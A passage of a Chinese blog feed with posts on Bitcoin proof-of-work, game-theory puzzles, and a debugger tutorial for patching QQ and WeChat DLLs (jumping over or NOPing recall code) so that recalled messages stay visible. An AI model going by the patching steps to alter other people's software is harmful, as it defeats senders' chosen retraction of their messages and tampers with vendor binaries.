并且正着算容易，反过来算很难（即可以通过字符串得到摘要，但不能通过摘要获得字符串）<br><strong>以SHA256函数举例：</strong></p><pre><code>sha256("abcd") = 1010...(256位二进制数)正算很容易，反算很难。如果给出一串256位的二进制数，求原来的输入，就只能通过一个一个尝试的方式去寻找。</code></pre><h4 id="具体原理"><a href="#具体原理" class="headerlink" title="具体原理"></a>具体原理</h4><p><strong>区块由头部和账单信息组成。</strong><br><img src="https://img-blog.csdnimg.cn/20200412181422148.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt="区块组成"><br>假设现在有很多人想要去接块，每个人都有一分记录好的账单。<br>在接块的时候必须要算一个数学题：<br><strong>1.字符串：前块的头部+账单信息+时间戳+…+随机数</strong><br><strong>2.Hash=sha256(sha256(字符串))</strong><br><strong>3.计算得到的Hash值需要符合要求</strong></p><blockquote><p>比如说要求前n位为0:即 Hash=000…11011（前n位为0即可满足条件，获得接块的权利）</p></blockquote><p><strong>4.符合要求之后进行打包</strong><br>把计算得到的Hash值作为新块的头部，账单作为新块的信息，即可打包成一个新块从而获得奖励。<br><img src="https://img-blog.csdnimg.cn/20200412182346723.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt="新块上链"><br><strong>怎么去使得字符串满足要求？</strong><br>我们来看字符串的组成，<strong>字符串：前块的头部+账单信息+时间戳+…+随机数</strong></p><p><strong>我们可以改变的只有随机数，二进制从0开始一直尝试。</strong> 每个人的计算难度是不一样的，但是平均而言，挖到矿的可能性大小与计算能力相关联，谁的计算能力强，谁就有更大的可能去挖到这个矿。</p><h4 id="挖矿难度设置"><a href="#挖矿难度设置" class="headerlink" title="挖矿难度设置"></a>挖矿难度设置</h4><p><strong>挖矿难度由要求Hash值的前n位来设置。</strong><br>前n位为指定数，比如前n个都是0，概率为 (1/2)^n^ 。<br>中本聪当初设置在每十分钟出一个块，如何保证在10分钟内能出一个块呢？则需要调整n的大小即挖矿难度。</p><blockquote><p>例：假设世界上有10^4^台矿机，每台矿机的运算速度为14T/s(即每秒可以进行1.4 <em> 10^13^次哈希运算)<br>10min计算次数：1.4 </em> 10^13^ <em> 10^4^ </em> 600 = 8 * 10^19^ ,大概相当于 2^66^ 。在这种情况下，就会把难度n设置为66。</p></blockquote><hr><h1 id="第二节"><a href="#第二节" class="headerlink" title="第二节"></a>第二节</h1><p>接上一节区块链和比特币的基本介绍，我们知道比特币的所有记录都是公开而且匿名的。这样比特币会面临几个问题：如何去解决伪造记录、篡改记录以及双重支付的问题。</p><h2 id="身份认证"><a href="#身份认证" class="headerlink" title="身份认证"></a>身份认证</h2><blockquote><p>在传统认证方式中，通常会使用人脸认证、签名认证、指纹认证等方式，但是在电子支付系统上都不能实现，因为上述方式可以被拷贝之后伪造。</p></blockquote><h3 id="电子签名"><a href="#电子签名" class="headerlink" title="电子签名"></a>电子签名</h3><p>电子签名技术采用了目前广泛使用的非对称加密方式 <img src="https://img-blog.csdnimg.cn/20200412191558459.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt="电子签名技术"></p><h2 id="如何解决伪造记录"><a href="#如何解决伪造记录" class="headerlink" title="如何解决伪造记录"></a>如何解决伪造记录</h2><p>流程图：<br><img src="https://img-blog.csdnimg.cn/20200412211725241.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt="防止伪造记录"><br>解决伪造记录的关键在于使用<strong>非对称加密方式</strong></p><p>A给B10个比特币这一事件，通过hash运算得到摘要之后，用私钥对摘要进行加密得到密码。由于私钥的唯一性，摘要具有唯一性。通过广播的方式，A传递出去的消息有：A给B10个比特币，A的公钥，A的密码。<br>我们可以假设，A给B10个比特币的消息是假的，并根据此hash运算得到了摘要1。而利用A的公钥解密密码得到了摘要2，此时摘要1和摘要2不同，显然”A给B10个比特币”是伪造的消息。</p><h2 id="双重支付问题"><a href="#双重支付问题" class="headerlink" title="双重支付问题"></a>双重支付问题</h2><h3 id="余额检查-追溯法"><a href="#余额检查-追溯法" class="headerlink" title="余额检查(追溯法)"></a>余额检查(追溯法)</h3><blockquote><p>每个人在使用区块链比特币的时候，都会下载从第一个区块到目前为止的所有信息。<br>比如A广播了数据”A支付给B10个比特币”，其他人就会进行余额检查，检查A是否有这个支付能力，如果没有这个支付能力，那么其他人就不会去确认A广播的这条信息。当”A支付给B10个比特币”这个信息被打包到一个新的块里面，此时这条信息被确认。<br><img src="https://img-blog.csdnimg.cn/2020041221464217.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt="消息确认"></p></blockquote><h3 id="双重支付"><a href="#双重支付" class="headerlink" title="双重支付"></a>双重支付</h3><blockquote><p>当双重支付发生时，比如A只有10个比特币，但同时广播了消息”A给B10个比特币”(记为消息b)和”A给C10个比特币”（记为消息c），群体D先接收到消息b，则不会去确认消息c。同理，群体E先接收到消息c，则不会去确认消息b。这时候就要看群体D和E中谁先能计算出那道数学题，先挖出矿的可以把自己确认的消息写到新块中，而另一条消息则失效。<br><img src="https://img-blog.csdnimg.cn/20200412215749444.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt="如何防止双重支付"></p></blockquote><h2 id="防止篡改问题"><a href="#防止篡改问题" class="headerlink" title="防止篡改问题"></a>防止篡改问题</h2><h3 id="最长链原则"><a href="#最长链原则" class="headerlink" title="最长链原则"></a>最长链原则</h3><blockquote><p>当区块链出现分支的情况下，即有不止一个人在近乎相同时间内挖出了下一个块，链的走向出现了分支，一般而言使用最长链原则进行选择。假设用户群体A选择上链继续挖矿，用户群体B选择下链继续挖矿。如果群体A先挖出下一个矿，上链新块，则群体B转到新块后继续挖矿。通常情况下，下链被废弃。<br><img src="https://img-blog.csdnimg.cn/20200412221257165.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt="最长链原则"></p></blockquote><h3 id="如何防止篡改"><a href="#如何防止篡改" class="headerlink" title="如何防止篡改"></a>如何防止篡改</h3><blockquote><p>由最长链原则我们可以知道，如果有人想篡改区块链上某一区块的信息，他就要在该区块处引出一条分支，并且打造一条新链使得新链超过原链长度。即他一人控制的矿机算力要超过全世界剩余的矿机算力，显然很难实现。<br><img src="https://img-blog.csdnimg.cn/20200412222625409.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt="篡改信息"></p></blockquote><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Bitcoin </category>
          
          <category> Block Chain </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Block Chain </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>博弈论 | 三姬分金与囚徒困境</title>
      <link href="/2020/04/11/game/"/>
      <url>/2020/04/11/game/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>昨天在刷李永乐老师视频的时候看到了一个“三姬分金”的问题，然后引到了博弈论。说实话，从这个老师的课程中深深的感受到了知识的魅力。就想着写一个专栏，学习一下博弈论的有关知识。</p><p><strong>什么是博弈</strong></p><blockquote><p>通俗地讲， 博弈就是指游戏中的一种选择策略的研究。 博弈的英文为“game”， 我们一般将它翻译成“游戏”。 而在英语中， “game”的意义不同于汉语中的游戏， 它是人们遵循一定规则的活动， 进行活动的人的目的是让自己“赢”。 我们在和对手竞赛或游戏的时候怎样使自己赢呢？ 这不但要考虑自己的策略， 还要考虑其他人的选择。 生活中博弈的案例很多， 只要涉及人群的互动以及选择决策， 就有博弈。<br>一个人做选择时必须考虑其他人的选择或是事务的变化， 而其他人做选择时也会考虑此人的选择。 此人的结果——博弈论称之为支付， 不仅取决于他的行动选择——博弈论称之为策略选择， 同时取决于其他人的策略选择。 这样， 此人和其他人或事务就构成一个博弈。</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20200411201405346.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70#pic_center" alt="博弈"></p><h2 id="三姬分金问题"><a href="#三姬分金问题" class="headerlink" title="三姬分金问题"></a>三姬分金问题</h2><h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><blockquote><p>当年，韩非子到一个大将军处索要军饷，看见大将军的三个妃子在玩分金币的游戏。于是韩非子提议，玩点更刺激的。</p></blockquote><h3 id="游戏规则"><a href="#游戏规则" class="headerlink" title="游戏规则"></a>游戏规则</h3><blockquote><p>现有A、B、C三名美姬，分100枚金币。从A开始，每个人依次提议分配方案。如果提议赞同人数不超过50%，则提议人被处死。反之则提议通过。A、B、C的顺序通过抽签来决定。<br>此外，有两点前提：<br>1.每个人都是聪明的，即她知道每个提议带来的后果，并追求自己利益的最大化。<br>2.每个人都是邪恶的，在她追求自己利益最大化的同时，要尽量多的杀死其余美姬。</p></blockquote><h3 id="思维实验0"><a href="#思维实验0" class="headerlink" title="思维实验0"></a>思维实验0</h3><p>如果游戏按照规则进行，那么结果会是怎样？<br>（1）我们不妨先假设A的提议被B、C否决：<br>美姬A被处死，到美姬B提议，根据规则”赞同人数不超过50%则提议人被处死”，故无论美姬B提议什么，美姬C都不会同意（即使B提议金币全给C也是如此）。美姬B这么聪明当然也考虑到了这个问题。<br>（2）美姬A提议必然通过：<br>由（1）中分析，美姬A的提议必然会被B同意（B不同意就死），所以A可以肆无忌惮的提议分配方案，故A提出了（100,0,0）的分配方案，实现了自己利益最大化。</p><p><strong>在思维实验0中，美姬A具有先手优势。</strong></p><hr><h3 id="思维实验1"><a href="#思维实验1" class="headerlink" title="思维实验1"></a>思维实验1</h3><p>假设在美姬A前面加一个美姬X，其他规则不变，结果会如何？<br>（1）不妨先假设美姬X的提议被否决：<br>美姬X被处死，到美姬A提议，参考思维实验0可知，美姬A还是提出（100,0,0）的提议，且必定被通过。<br>（2）美姬X提出方案对B，C有利则会被通过：<br>美姬X考虑到如果由美姬A提议，则B,C什么都得不到。故美姬X决定拉拢美姬B,C。她提出了（98,0，1,1）的分配方案。美姬A肯定不同意（但是没有用），美姬B,C一看还能得到1枚金币，于是通过了美姬X的提议方案。<br><strong>在思维实验1中，美姬X具有先手优势，即领导群体，美姬B、C属于基层群体，是领导群体拉拢的对象。在有限次的实验中，拿到先手权意味着锁定胜局。而且只要条件规则稳定，结果是一定的，这样的局面叫做纳什均衡</strong></p><hr><h3 id="思维实验2"><a href="#思维实验2" class="headerlink" title="思维实验2"></a>思维实验2</h3><p><strong>共谋</strong></p><blockquote><p>在思维实验1的背景下，美姬A,B,C觉得不公平，还想实现利益最大化。于是A提议：否定美姬X的提议，A,B,C各分33枚金币，剩下一枚丢进海里。这个过程叫做”共谋”。</p></blockquote><p>那么在实验的过程中，如何保证在杀掉美姬X之后，美姬A信守承诺均分金币呢？<br>A,B,C之间需要制定一个契约，规定B,C帮助A杀掉X之后，A能信守承诺均分金币。此外，为了防止A撕毁契约，还需要执行和守护契约的团体，通过分权的方式使其不能串通。执行和守护契约的团体的建立权在B,C手中，即实现了”民主”。</p><hr><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>三姬分金这个故事很好的解释了社会中的一些现象：古代统治者为何需要拉拢底层人民、为何大副都想当船长…</p><blockquote><p>《1984》里面写到：有史以来，大概自从新石器时代结束以来，世上就有三种人，即上等人、中等人、下等人。 这三种人的目标是完全不可调和的。上等人的目标是要保持他们的地位。中等人的目标是要同高等人交换地位。下等人的特点始终是，他们劳苦之余无暇旁顾，偶而才顾到日常生活以外的事，因此他们如果有目标的话，无非是取消一切差别，建立一个人人平等的社会。</p></blockquote><hr><h2 id="囚徒困境问题"><a href="#囚徒困境问题" class="headerlink" title="囚徒困境问题"></a>囚徒困境问题</h2><h3 id="问题简介"><a href="#问题简介" class="headerlink" title="问题简介"></a>问题简介</h3><p><a href="https://wiki.mbalib.com/wiki/%E5%9B%9A%E5%BE%92%E5%9B%B0%E5%A2%83" target="_blank" rel="noopener">囚徒困境</a>是博弈论的<a href="https://wiki.mbalib.com/wiki/%E9%9D%9E%E9%9B%B6%E5%92%8C%E5%8D%9A%E5%BC%88" target="_blank" rel="noopener">非零和博弈</a>中具代表性的例子，反映个人最佳选择并非团体最佳选择。虽然困境本身只属模型性质，但现实中的价格竞争、环境保护等方面，也会频繁出现类似情况。</p><hr><h3 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h3><p>1950年，由就职于兰德公司的梅里尔·弗拉德（Merrill Flood）和梅尔文·德雷希尔（Melvin Dresher）拟定出相关困境的理论，后来由顾问阿尔伯特·塔克（Albert Tucker）以囚徒方式阐述，并命名为“囚徒困境”。经典的囚徒困境如下：</p><blockquote><p>警方逮捕甲、乙两名嫌疑犯，但没有足够证据指控二人入罪。于是警方分开囚禁嫌疑犯，分别和二人见面，并向双方提供以下相同的选择：</p></blockquote><blockquote><p>若一人认罪并作证检举对方（相关术语称“背叛”对方），而对方保持沉默，此人将即时获释，沉默者将判监10年。<br><img src="https://img-blog.csdnimg.cn/20200411203310243.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70#pic_center" alt="一方背叛"></p></blockquote><blockquote><p>若二人都保持沉默（相关术语称互相“合作”），则二人同样判监一年。<br><img src="https://img-blog.csdnimg.cn/20200411203250576.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70#pic_center" alt="双方背叛/双方合作"></p></blockquote><blockquote><p>若二人都互相检举（互相“背叛”），则二人同样判监8年。</p></blockquote><p><strong>表格描述</strong></p><table><thead><tr><th>囚徒行为</th><th>甲沉默（合作）</th><th>甲认罪（背叛）</th></tr></thead><tbody><tr><td>乙沉默（合作）</td><td>二人同服刑1年</td><td>甲当即释放，乙服刑10年</td></tr><tr><td>乙认罪（背叛）</td><td>乙当即释放，甲服刑10年</td><td>二人同服刑8年</td></tr></tbody></table><p>如同博弈论的其他例证，囚徒困境假定每个参与者（即“囚徒”）都是利己的，即都寻求最大自身利益，而不关心另一参与者的利益。参与者某一策略所得利益，如果在任何情况下都比其他策略要低的话，此策略称为“严格劣势策略”，理性的参与者绝不会选择。另外，没有任何其他力量干预个人决策，参与者可完全按照自己意愿选择策略。</p><hr><h3 id="思维实验0-1"><a href="#思维实验0-1" class="headerlink" title="思维实验0"></a>思维实验0</h3><p>（1）从个体来看，囚徒的选择如下：</p><ul><li>如果对方选择沉默，背叛可以使我获释</li><li>如果对方选择背叛，背叛可以使我的刑期减少</li></ul><p><strong>即从个体角度出发，背叛无疑是最优选择。</strong> 这场博弈中唯一可能达到的纳什均衡，就是双方参与者都背叛对方，结果二人同样服刑8年。</p><p>（2）从团体角度来看，如果两个参与者都合作保持沉默，两人都只会被判刑一年，总体利益更高，结果也比两人背叛对方、判刑8年的情况较佳。但根据以上假设，二人均为理性的个人，且只追求自己个人利益。均衡状况会是两个囚徒都选择背叛，结果二人判决均比合作为高，总体利益较合作为低。这就是“困境”所在。例子漂亮地证明了：非零和博弈中，<a href="https://wiki.mbalib.com/wiki/%E5%B8%95%E7%B4%AF%E6%89%98%E6%9C%80%E4%BC%98" target="_blank" rel="noopener">帕累托最优</a>和<a href="https://wiki.mbalib.com/wiki/%E7%BA%B3%E4%BB%80%E5%9D%87%E8%A1%A1" target="_blank" rel="noopener">纳什均衡</a>是相冲突的。</p><hr><h3 id="思维实验1-1"><a href="#思维实验1-1" class="headerlink" title="思维实验1"></a>思维实验1</h3><p><strong>当囚徒困境多次重复发生</strong></p><blockquote><p>单次发生的囚徒困境，和多次重复的囚徒困境结果不会一样。在重复的囚徒困境中，博弈被反复地进行。因而每个参与者都有机会去“惩罚”另一个参与者前一回合的不合作行为。这时，合作可能会作为均衡的结果出现。欺骗的动机这时可能被受到惩罚的威胁所克服，从而可能导向一个较好的、合作的结果。作为反复接近无限的数量，纳什均衡趋向于帕累托最优。</p></blockquote><hr><h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p><strong>囚徒困境主旨</strong></p><blockquote><p>囚徒困境的主旨为，囚徒们虽然彼此合作，坚决不坦白，可为全体带来最佳利益（累计和最少刑期），但在资讯不明的情况下，因为出卖同伙可为自己带来利益（缩短刑期）。同伙坦白可为他带来利益，因此彼此出卖虽违反最佳共同利益，反而是自己最大利益所在。但实际上，执法机构不可能设立如此情境来诱使所有囚徒招供，因为囚徒们必须考虑刑期以外之因素（出卖同伙会受到报复等），而无法完全以执法者所设立之利益（刑期）作考量。</p></blockquote><p><strong>囚徒困境的应用</strong></p><blockquote><p>许多行业的价格竞争都是典型的囚徒困境现象，每家企业都以对方为敌手，只关心自己的利益。在价格博弈中，只要以对方为敌手，那么不管对方的决策怎样，自己总是以为采取低价策略会占便宜，这就促使双方都采取低价策略。如可口可乐公司和百事可乐公司之间的竞争、各大航空公司之间的价格竞争等等。</p></blockquote><blockquote><p>在国内的家电大战中，虽然不是两个对手之间的博弈，但由于在众多对手当中每一方的市场份额都很大，每一个主体人的行为后果受对手行为的影响都很大，因此，其情景大概也是如此。如果清楚这种前景，双方勾结或合作起来，都制定比较高的价格，那么双方都可以因为避免价格大战而获得较高的利润。但是往往这些联盟处于利益驱动的“囚徒困境”，双赢也就成泡影。五花八门的价格联盟总是非常短命，道理就在这里。</p></blockquote><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 博弈论 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 三姬分金 </tag>
            
            <tag> 囚徒困境 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>授人以鱼不如授人以渔 | QQ、微信防撤回详解</title>
      <link href="/2020/04/03/revoke/"/>
      <url>/2020/04/03/revoke/</url>
      
        <content type="html"><![CDATA[<blockquote><p>前言：哦吼？暗恋的女生/男生发消息又撤回了？表白没看到怎么办？！今天整理一下PC端QQ、微信防撤回的具体步骤，自己修改dll文件，再也不用担心网络上的dll被植入后门啦！<br>P.S. 本教程理论上适合目前更新的所有版本QQ/Wechat，但手法有些粗糙。</p></blockquote><p><img src="https://img-blog.csdnimg.cn/2020040310205548.jpg" alt=""></p><h2 id="工具准备"><a href="#工具准备" class="headerlink" title="工具准备"></a>工具准备</h2><ol><li>x32dbg</li><li>PC端Wechat/QQ<h2 id="QQ防撤回"><a href="#QQ防撤回" class="headerlink" title="QQ防撤回"></a>QQ防撤回</h2><h3 id="QQ版本"><a href="#QQ版本" class="headerlink" title="QQ版本"></a>QQ版本</h3><img src="https://img-blog.csdnimg.cn/20200403102452473.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt="QQ9.2.3"><h3 id="破解过程"><a href="#破解过程" class="headerlink" title="破解过程"></a>破解过程</h3>1.<strong>运行QQ，打开x32dbg，附加到进程QQ.exe</strong><br><img src="https://img-blog.csdnimg.cn/20200403103639294.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70#pic_center" alt="附加程序"><br>2.<strong>在符号面板搜索im.dll，来到im.dll模块（该模块是负责QQ个人消息和群消息接收的模块）</strong><br><img src="https://img-blog.csdnimg.cn/20200403103808379.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70#pic_center" alt="搜索im.dll"><br><img src="https://img-blog.csdnimg.cn/20200403104650553.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70#pic_center" alt="im.dll模块界面"><br>3.<strong>搜索关键字符串：bytes_reserved 和 bytes_userdef</strong><br>“bytes_reserved”字符串负责个人信息的撤回，“bytes_userdef”字符串负责群消息的撤回。<br><img src="https://img-blog.csdnimg.cn/2020040310483365.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><img src="https://img-blog.csdnimg.cn/20200403104916254.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70#pic_center" alt="搜索bytes_reserved字符串"><br>双击进入第三个字符串，在入口的上一条地址处，修改汇编指令，让其直接到达test eax,eax命令处，这样就避免了消息的撤回。<br><img src="https://img-blog.csdnimg.cn/20200403105030615.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70#pic_center" alt="注意是修改push ecx"><br><img src="https://img-blog.csdnimg.cn/20200403105137382.jpg#pic_center" alt="修改完成"><br><img src="https://img-blog.csdnimg.cn/2020040310520227.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70#pic_center" alt="搜索bytes_userdef字符串"><br><img src="https://img-blog.csdnimg.cn/20200403105236880.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70#pic_center" alt="bytes_userdef界面"><br><img src="https://img-blog.csdnimg.cn/20200403105352664.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70#pic_center" alt="修改push指令为jmp"><br>注意，此处是直接从push im.7A9D7C68处跳转到 test eax,eax<br><img src="https://img-blog.csdnimg.cn/20200403105520279.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70#pic_center" alt="完成修改"><ol start="4"><li><strong>保存补丁并导出IM.dll文件进行替换</strong><br><img src="https://img-blog.csdnimg.cn/20200403105714928.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70#pic_center" alt="生成补丁"><br><img src="https://img-blog.csdnimg.cn/20200403105738387.jpg#pic_center" alt="导出为IM.dll"></li><li><strong>成果图</strong><br><img src="https://img-blog.csdnimg.cn/20200403110152765.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70#pic_center" alt="防撤回成功"><h3 id="过程总结"><a href="#过程总结" class="headerlink" title="过程总结"></a>过程总结</h3>QQ消息撤回的机制并没有进行很好的防御，主要原因在于已经接受到的消息，是储存在本地的，而消息撤回，则是调用函数从本地撤回，只要阻止这个机制就能实现消息的防撤回。由于时间原因，过程中的部分函数的原理没有深究，准备后期再来分析一下，要是能做出一个一体化的exe文件就更好了。总体来说，这个防撤回做的还是很有意思，在过程中能学到很多东西。<h2 id="微信防撤回"><a href="#微信防撤回" class="headerlink" title="微信防撤回"></a>微信防撤回</h2><h3 id="微信版本"><a href="#微信版本" class="headerlink" title="微信版本"></a>微信版本</h3><img src="https://img-blog.csdnimg.cn/20200403110313354.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt="微信 2.8.0.121"><h3 id="破解过程-1"><a href="#破解过程-1" class="headerlink" title="破解过程"></a>破解过程</h3></li><li><strong>启动微信，打开x32dbg，附加到微信进程。</strong><br>附加到wechat.exe后，在符号面板找到wechatwin.dll模块（该模块负责微信消息的撤回）<br><img src="https://img-blog.csdnimg.cn/20200403110537601.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70#pic_center" alt="找到wechatwin.dll"></li><li><strong>在wechatwin.dll模块中寻找revokemsg字符串</strong><br><img src="https://img-blog.csdnimg.cn/20200403110823983.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70#pic_center" alt="wechatwin.dll模块"><br>“revokemsg”出现次数可能较多，要选择在<strong>ChatMgr::RefreshUnReadCountByRevoke</strong>下面的第一个(L “&lt; revokemsg &gt;”不算)<br><img src="https://img-blog.csdnimg.cn/20200403110857557.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70#pic_center" alt="搜索revoke，找到revokemsg字符串"></li><li><strong>点击跳转之后把当前位置下的第一个call指令nop掉</strong>（该call指令用于撤回消息）<br><img src="https://img-blog.csdnimg.cn/2020040311210256.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70#pic_center" alt="nop 目标指令"><br><img src="https://img-blog.csdnimg.cn/20200403112143901.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70#pic_center" alt="nop完成"></li><li><strong>保存补丁文件、导出WeChatWin.dll文件并替换原安装目录下的文件</strong><br><img src="https://img-blog.csdnimg.cn/20200403112300717.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70#pic_center" alt="保存补丁"></li><li><strong>成果图</strong><br><img src="https://img-blog.csdnimg.cn/20200403112358499.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70#pic_center" alt="破解成功"><h3 id="过程总结-1"><a href="#过程总结-1" class="headerlink" 